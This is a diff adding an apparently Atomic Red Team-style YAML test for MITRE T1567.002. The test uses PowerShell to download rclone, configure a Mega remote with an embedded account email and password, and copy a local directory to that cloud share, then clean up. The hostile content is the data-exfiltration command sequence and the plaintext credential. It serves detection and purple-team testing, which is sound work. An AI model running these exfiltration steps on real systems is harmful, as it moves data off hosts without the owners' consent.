@@ -1,0 +1,62 @@
+attack_technique: T1567.002
+display_name: 'Exfiltration Over Web Service: Exfiltration to Cloud Storage'
+atomic_tests:
+- name: Exfiltrate data with rclone to cloud Storage - Mega (Windows)
+  auto_generated_guid: 8529ee44-279a-4a19-80bf-b846a40dda58
+  description: |
+    This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)
+    See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/
+  supported_platforms:
+  - windows
+  input_arguments:
+    rclone_path:
+      description: Directory of rclone.exe
+      type: Path
+      default: $env:temp\T1567.002\rclone-v*\
+    rclone_config_path:
+      description: Path to rclone's config file (default should be fine)
+      type: path
+      default: $env:appdata
+    dir_to_copy:
+      description: Directory to copy
+      type: String
+      default: $env:temp\T1567.002
+    mega_user_account:
+      description: Mega user account
+      type: String
+      default: atomictesting@outlook.com
+    mega_user_password:
+      description: Mega user password
+      type: String
+      default: vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA
+    remote_share:
+      description: Remote Mega share
+      type: String
+      default: T1567002
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      rclone must exist at (#{rclone_path})
+    prereq_command: |
+      if (Test-Path #{rclone_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -OutFile $env:temp\rclone.zip
+      Expand-archive -path $env:temp\rclone.zip -destinationpath $env:temp\T1567.002\ -force
+  executor:
+    command: |
+     New-Item #{rclone_config_path}\rclone -ItemType directory
+     New-Item #{rclone_config_path}\rclone\rclone.conf
+     cd #{rclone_path}
+     .\rclone.exe config create #{remote_share} mega
+     set-Content #{rclone_config_path}\rclone\rclone.conf "[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}"
+     .\rclone.exe copy --max-size 1700k #{dir_to_copy} #{remote_share}:test -v
+    cleanup_command: |
+     cd #{rclone_path}
+     .\rclone.exe purge #{remote_share}:test
+     .\rclone.exe config delete #{remote_share}:
+     Remove-Item #{rclone_config_path}\rclone -recurse -force -erroraction silentlycontinue
+     cd c:\
+     Remove-Item $env:temp\rclone.zip
+     Remove-Item $env:temp\T1567.002 -recurse -force
+    name: powershell
+    elevation_required: false
